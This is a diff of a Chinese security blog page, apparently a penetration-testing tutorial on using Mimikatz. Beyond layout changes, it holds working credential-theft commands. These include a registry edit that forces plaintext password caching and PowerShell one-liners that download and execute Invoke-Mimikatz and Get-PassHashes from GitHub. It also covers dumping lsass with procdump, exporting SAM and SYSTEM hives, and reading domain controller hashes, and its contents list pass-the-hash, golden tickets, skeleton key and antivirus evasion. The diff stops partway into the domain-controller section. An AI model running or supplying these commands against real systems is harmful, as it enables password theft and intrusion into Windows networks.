@@ -11,7 +11,7 @@
   <meta itemprop="name" content="mimikatz">
   <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
   <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
-  <meta itemprop="wordCount" content="599">
+  <meta itemprop="wordCount" content="573">
   <meta itemprop="keywords" content="攻防,工具"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/45/">
   <meta property="og:site_name" content="东隅 Blog">
   <meta property="og:title" content="mimikatz">
@@ -37,7 +37,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7\/45\/"
-    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 工具","wordcount":  599 ,
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 工具","wordcount":  573 ,
     "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7\/45\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
       "@type": "Organization",
       "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
@@ -144,7 +144,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Mimikatz</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="599 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 600 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="573 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 600 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -152,30 +152,65 @@
         </div>
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#获取本地账户密码">获取本地账户密码</a>
       <ul>
-        <li></li>
+        <li><a href="#本地执行">本地执行</a></li>
+        <li><a href="#sam表获取hash">SAM表获取hash</a></li>
       </ul>
     </li>
+    <li><a href="#procdumpmimikatz">procdump+mimikatz</a></li>
+    <li><a href="#读取域控中域成员hash">读取域控中域成员Hash</a>
+      <ul>
+        <li><a href="#域控本地读取">域控本地读取</a></li>
+        <li><a href="#导出域成员hash">导出域成员hash</a></li>
+        <li><a href="#secretsdump脚本直接导出域hash">secretsdump脚本直接导出域hash</a></li>
+      </ul>
+    </li>
+    <li><a href="#哈希传递攻击pth">哈希传递攻击PTH</a>
+      <ul>
+        <li><a href="#工作组环境">工作组环境</a></li>
+        <li><a href="#域环境">域环境</a></li>
+        <li><a href="#msf进行哈希传递">MSF进行哈希传递</a></li>
+      </ul>
+    </li>
+    <li><a href="#票据传递攻击ptt">票据传递攻击PTT</a>
+      <ul>
+        <li><a href="#黄金票据">黄金票据</a></li>
+        <li><a href="#白银票据">白银票据</a></li>
+        <li><a href="#skeleton-key">skeleton key</a></li>
+        <li><a href="#ms14-068">MS14-068</a></li>
+      </ul>
+    </li>
+    <li><a href="#其他">其他</a>
+      <ul>
+        <li><a href="#导出chrome中的密码">导出chrome中的密码</a></li>
+        <li><a href="#隐藏功能">隐藏功能</a></li>
+        <li><a href="#免杀">免杀</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#sid">SID</a></li>
   </ul>
 </nav></div>
       </div><div class="content" id="content" data-end-flag="-----（完）-----"><p>项目地址：https://github.com/gentilkiwi/mimikatz/</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406091020515.webp" alt="image-20240609102026356" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406091020515.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406091020515.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202406091020515.webp?size=large 2x" data-title="image-20240609102026356" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h5 id="一工具简介" class="heading-element"><span>0.0.0.1  一、工具简介</span>
+<h1 id="一工具简介" class="heading-element"><span>一、工具简介</span>
   <a href="#%e4%b8%80%e5%b7%a5%e5%85%b7%e7%ae%80%e4%bb%8b" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>Mimikatz是法国人benjamin开发的一款功能强大的轻量级调试工具，本意是用来个人测试，但由于其功能强大，能够直接读取WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具。</p>
+</h1><p>Mimikatz是法国人benjamin开发的一款功能强大的轻量级调试工具，本意是用来个人测试，但由于其功能强大，能够直接读取WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具。</p>
 <p>Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接==从 lsass.exe 进程中获取当前登录系统用户名的密码==， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，==通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中==，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，==只限当前登陆系统==！</p>
 <p>注：但是在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。</p>
 <p>mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。</p>
 <p>cmd修改注册表命令：</p>
 <pre tabindex="0"><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
-#####重启或用户重新登录后可以成功抓取</code></pre><h5 id="二mimikatz命令" class="heading-element"><span>0.0.0.2  二、Mimikatz命令</span>
+#重启或用户重新登录后可以成功抓取</code></pre><h1 id="二mimikatz命令" class="heading-element"><span>二、Mimikatz命令</span>
   <a href="#%e4%ba%8cmimikatz%e5%91%bd%e4%bb%a4" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">cls：</span>       <span style="color:#58a1dd">清屏</span>
+</h1><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">cls：</span>       <span style="color:#58a1dd">清屏</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">standard：</span>  <span style="color:#58a1dd">标准模块，基本命令</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">crypto：</span>    <span style="color:#58a1dd">加密相关模块</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">sekurlsa：</span>  <span style="color:#58a1dd">与证书相关的模块</span>
@@ -234,56 +269,65 @@
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">rdm：</span>       <span style="color:#58a1dd">RDM（830AL）器件的射频模块</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">acr：</span>       <span style="color:#58a1dd">ACR模块</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">version：</span>   <span style="color:#58a1dd">查看版本</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff636f">exit</span><span style="color:#58a1dd">：</span>      <span style="color:#58a1dd">退出</span></span></span></code></pre></div><h5 id="三常见使用" class="heading-element"><span>0.0.0.3  三、常见使用</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">exit</span><span style="color:#58a1dd">：</span>      <span style="color:#58a1dd">退出</span></span></span></code></pre></div><h1 id="三常见使用" class="heading-element"><span>三、常见使用</span>
   <a href="#%e4%b8%89%e5%b8%b8%e8%a7%81%e4%bd%bf%e7%94%a8" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>九种姿势运行：Mimikatz：https://www.freebuf.com/articles/web/176796.html</p>
+</h1><p>九种姿势运行：Mimikatz：https://www.freebuf.com/articles/web/176796.html</p>
 <p>借用PowerShell</p>
-<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####读取密码明文(需要管理员权限)</span>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#读取密码明文(需要管理员权限)</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">powershell</span> <span style="color:#58a1dd">IEX </span>(<span style="color:#58a1dd">New-Object</span> <span style="color:#58a1dd">Net</span>.<span style="color:#58a1dd">WebClient</span>).<span style="color:#58a1dd">DownloadString</span>(<span style="color:#a6be9d">&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;</span>); <span style="color:#58a1dd">Invoke-Mimikatz</span> –<span style="color:#58a1dd">DumpCerts</span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####读取密码hash值(需要管理员权限)</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#读取密码hash值(需要管理员权限)</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">powershell</span> <span style="color:#58a1dd">IEX </span>(<span style="color:#58a1dd">New-Object</span> <span style="color:#58a1dd">Net</span>.<span style="color:#58a1dd">WebClient</span>).<span style="color:#58a1dd">DownloadString</span>(<span style="color:#a6be9d">&#39;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#39;</span>);<span style="color:#58a1dd">Get-PassHashes</span></span></span></code></pre></div><p>==mimikatz许多功能都需要管理员权限，如果不是管理员权限不能debug==</p>
-<h6 id="获取本地账户密码" class="heading-element"><span>0.0.0.3.1  获取本地账户密码</span>
+<h2 id="获取本地账户密码" class="heading-element"><span>获取本地账户密码</span>
   <a href="#%e8%8e%b7%e5%8f%96%e6%9c%ac%e5%9c%b0%e8%b4%a6%e6%88%b7%e5%af%86%e7%a0%81" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>####### 本地执行</p>
-<p>下载mimikatz程序，找到自己系统对应的位数，右键以管理员身份运行：</p>
+</h2><h3 id="本地执行" class="heading-element"><span>本地执行</span>
+  <a href="#%e6%9c%ac%e5%9c%b0%e6%89%a7%e8%a1%8c" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>下载mimikatz程序，找到自己系统对应的位数，右键以管理员身份运行：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-makefile" data-lang="makefile"><span style="display:flex;"><span>log
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####提升权限
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#提升权限
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">privilege</span><span style="color:#ff636f">::</span><span style="color:#58a1dd">debug</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####抓取密码
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#抓取密码
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">sekurlsa</span><span style="color:#ff636f">::</span><span style="color:#58a1dd">logonpasswords</span></span></span></code></pre></div><p>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。</p>
 <p>cmd修改注册表命令：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#ff636f">add</span> HKLM<span style="color:#a6be9d">\S</span>YSTEM<span style="color:#a6be9d">\C</span>urrentControlSet<span style="color:#a6be9d">\C</span>ontrol<span style="color:#a6be9d">\S</span>ecurityProviders<span style="color:#a6be9d">\W</span>Digest /v UseLogonCredential /t REG_DWORD /d <span style="color:#a6be9d">1</span> /f
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####重启或用户重新登录后可以成功抓取</span></span></span></code></pre></div><p>####### SAM表获取hash</p>
-<blockquote>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#重启或用户重新登录后可以成功抓取</span></span></span></code></pre></div><h3 id="sam表获取hash" class="heading-element"><span>SAM表获取hash</span>
+  <a href="#sam%e8%a1%a8%e8%8e%b7%e5%8f%96hash" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><blockquote>
 <p>SAM(安全账户管理器)，SAM是用来==存储Windows操作系统密码==的数据库文件，为了避免明文密码泄漏，SAM文件中保存的是明文密码经过一系列算法处理过的Hash值，被保存的Hash分为LM Hash、NTLMHash。在用户在本地或远程登陆系统时，会将Hash值与SAM文件中保存的Hash值进行对比。在后期的Windows系统中，SAM文件中被保存的密码Hash都被密钥SYSKEY加密。</p>
 <p>SAM文件在磁盘中的位置在C:\windows\system32\config\sam SAM文件在Windows系统启动后被系统锁定，无法进行移动和复制</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-makefile" data-lang="makefile"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####导出SAM数据
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-makefile" data-lang="makefile"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#导出SAM数据
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>reg save HKLM\SYSTEM SYSTEM
 </span></span><span style="display:flex;"><span>reg save HKLM\SAM SAM
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####使用mimikatz提取hash
-</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">lsadump</span><span style="color:#ff636f">::</span><span style="color:#58a1dd">sam</span> /<span style="color:#58a1dd">sam</span>:<span style="color:#58a1dd">SAM</span> /<span style="color:#58a1dd">system</span>:<span style="color:#58a1dd">SYSTEM</span></span></span></code></pre></div><h6 id="procdumpmimikatz" class="heading-element"><span>0.0.0.3.2  procdump+mimikatz</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#使用mimikatz提取hash
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">lsadump</span><span style="color:#ff636f">::</span><span style="color:#58a1dd">sam</span> /<span style="color:#58a1dd">sam</span>:<span style="color:#58a1dd">SAM</span> /<span style="color:#58a1dd">system</span>:<span style="color:#58a1dd">SYSTEM</span></span></span></code></pre></div><h2 id="procdumpmimikatz" class="heading-element"><span>procdump+mimikatz</span>
   <a href="#procdumpmimikatz" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:</p>
+</h2><p>当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#58a1dd">procdump64</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">exe</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">accepteula</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">ma</span> <span style="color:#58a1dd">lsass</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">exe</span> <span style="color:#58a1dd">lsass</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">dmp</span></span></span></code></pre></div><p>将lsass.dmp下载到本地后，然后执行mimikatz:</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mimikatz.exe <span style="color:#a6be9d">&#34;sekurlsa::minidump lsass.dmp&#34;</span> <span style="color:#a6be9d">&#34;sekurlsa::logonPasswords full&#34;</span> exit</span></span></code></pre></div><p>为了方便复制与查看，可以输出到本地文件里面：</p>
-<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mimikatz.exe <span style="color:#a6be9d">&#34;sekurlsa::minidump lsass.dmp&#34;</span> <span style="color:#a6be9d">&#34;sekurlsa::logonPasswords full&#34;</span> &gt; pssword.txt</span></span></code></pre></div><h6 id="读取域控中域成员hash" class="heading-element"><span>0.0.0.3.3  读取域控中域成员Hash</span>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mimikatz.exe <span style="color:#a6be9d">&#34;sekurlsa::minidump lsass.dmp&#34;</span> <span style="color:#a6be9d">&#34;sekurlsa::logonPasswords full&#34;</span> &gt; pssword.txt</span></span></code></pre></div><h2 id="读取域控中域成员hash" class="heading-element"><span>读取域控中域成员Hash</span>
   <a href="#%e8%af%bb%e5%8f%96%e5%9f%9f%e6%8e%a7%e4%b8%ad%e5%9f%9f%e6%88%90%e5%91%98hash" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>####### 域控本地读取</p>
-<p>注：得在域控上以域管理员身份执行mimikatz</p>
+</h2><h3 id="域控本地读取" class="heading-element"><span>域控本地读取</span>
+  <a href="#%e5%9f%9f%e6%8e%a7%e6%9c%ac%e5%9c%b0%e8%af%bb%e5%8f%96" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>注：得在域控上以域管理员身份执行mimikatz</p>
 <p>方法一：直接执行</p>
